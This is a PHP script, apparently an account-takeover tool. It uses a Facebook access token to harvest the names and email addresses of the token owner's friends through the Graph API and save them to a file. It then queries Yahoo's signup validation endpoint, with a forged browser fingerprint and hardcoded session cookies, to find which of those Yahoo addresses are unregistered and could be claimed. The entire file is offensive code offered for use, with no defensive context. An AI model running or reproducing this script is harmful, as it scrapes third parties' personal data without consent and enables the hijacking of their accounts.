<?php
function cek($email){
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://login.yahoo.com/account/module/create?validateField=yid');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22color_depth%22%3A24%2C%22device_memory%22%3A8%2C%22hardware_concurrency%22%3A12%2C%22resolution%22%3A%7B%22w%22%3A1920%2C%22h%22%3A1080%7D%2C%22available_resolution%22%3A%7B%22w%22%3A1040%2C%22h%22%3A1920%7D%2C%22timezone_offset%22%3A-420%2C%22session_storage%22%3A1%2C%22local_storage%22%3A1%2C%22indexed_db%22%3A1%2C%22open_database%22%3A1%2C%22cpu_class%22%3A%22unknown%22%2C%22navigator_platform%22%3A%22Win32%22%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webgl_vendor%22%3A%22Google%20Inc.~ANGLE%20(NVIDIA%20GeForce%20GTX%201060%20Direct3D11%20vs_5_0%20ps_5_0)%22%2C%22adblock%22%3A0%2C%22has_lied_languages%22%3A0%2C%22has_lied_resolution%22%3A0%2C%22has_lied_os%22%3A0%2C%22has_lied_browser%22%3A0%2C%22touch_support%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22audio_fp%22%3A%22124.0434474653739%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%22e43a8bc708fc490225cde0663b28278c%22%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1555892955174%2C%22render%22%3A1555892953680%7D%7D&specId=yidReg&cacheStored=true&crumb=eX2CIyEN5Rh&acrumb=6GPWxaum&sessionIndex=&done=https%3A%2F%2Fmail.yahoo.com%2F&googleIdToken=&authCode=&attrSetIndex=0&tos0=oath_freereg%7Cid%7Cid-ID&firstName=&lastName=&yid=$email&password=&shortCountryCode=ID&phone=&mm=&dd=&yyyy=&freeformGender=");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Cookie: B=8tttdqle7kd3b&b=3&s=ou; GUCS=AXtnzi5W; AS=v=1&s=6GPWxaum&d=C5cbe5c59|Uo.3a4P.2cLyC2nuB4qEG1XfcRxKC2hm1EbKPcqhcOG76F7EZyqU4.zroojGPAI59APrRGzaOgCZWOA7_fztjowogdqQOvna3LwibF7lt1arn.ku0VfAIWanIDhR0lSRTIRAl.HqHyW32hH6PrFa6_rnHNVkalCZzjhEfkl31Oa_2FFj3YR4HzH_8MNXBd.xu_8zIwEeRRp9pQ0DIqTZNLTDkunGtC3nDl63bCtPtJSFQc96QCi4CHOL.OnnZuOsWFEJzvvTf7AreFduHsMQiQLKJJgf1HOR9Smrtned.d9K1K01rEf9.PqWDkUokm42IqJG0S0JjHcK.R2rWnEfGeH3VZ3mNQ_eI5oBKu_ftIaY6kTB4UcI9ZheBaw9dGzKDxrbQI7.KAGOTPrv9GC9i8gezbOjJHHGdQLvn.0362QGxiNxQArHl6gOCIczLO_NJnJ00szYtOx5p7RRCSr86RCYkC6X4R2uI0l6UWJ.ujaqfcazHRbBBu9.ljRxx4BjIbvDgtoyauiMNG7.MTXcZHoKWhqq2NbcrO.Qe5KtMTW0PvublUpRGQT57Lxm4EE3tGRl3YZNqM2GbGoeAeA1ixxjSRJXiCGYSQMWhIXO3FCC_pOxFe.N.mGZKjOgYuwwzvn0gbWO.IRIa72LlL1kJq2HKXOLWjB8YUuXcMJH8k65jZ4C2tIbR..qKb88kXRCGjAHwMTfGl4lvpac7ngPKiv13B9do_0z4LvXrdiFAQ--~A';
$headers[] = 'Origin: https://login.yahoo.com';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Accept: */*';
$headers[] = 'Referer: https://login.yahoo.com/account/create?display=login&intl=id&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2F&nr=1&specId=yidReg';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Connection: keep-alive';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$json = json_decode($result, true);
//print_r($json);
if(preg_match("/IDENTIFIER_EXISTS/", $result)){
    return "Exist";
}else{
    return "Available";
}
}
function save($filename, $content)
	{
	    $save = fopen($filename, "a");
	    fputs($save, "$content\r\n");
	    fclose($save);
	}
	
##EDIT TOKENNYA##
$token = "EAAA";
##EDIT TOKENNYA##



$id = file_get_contents("https://graph.facebook.com/me/friends?access_token=".$token);

$json1 = json_decode($id);
$data = $json1->data;
for($i=0; $i<count($data); $i++){
$info = file_get_contents("https://graph.facebook.com/".$data[$i]->id."?access_token=".$token);
$json1 = json_decode($info);
$name = $json1->name;
$email = $json1->email;
$comp = $name."|".$email;
$em = explode("@", $email);
if($email != NULL){
echo $comp."\n";
save("hasilgrabemail.txt", $comp);
}
if(preg_match("/yahoo.com/", $email)){
//echo $comp."\n";
save("hasilcekyahoo.txt", $comp."|".cek($em[0]));
}
}

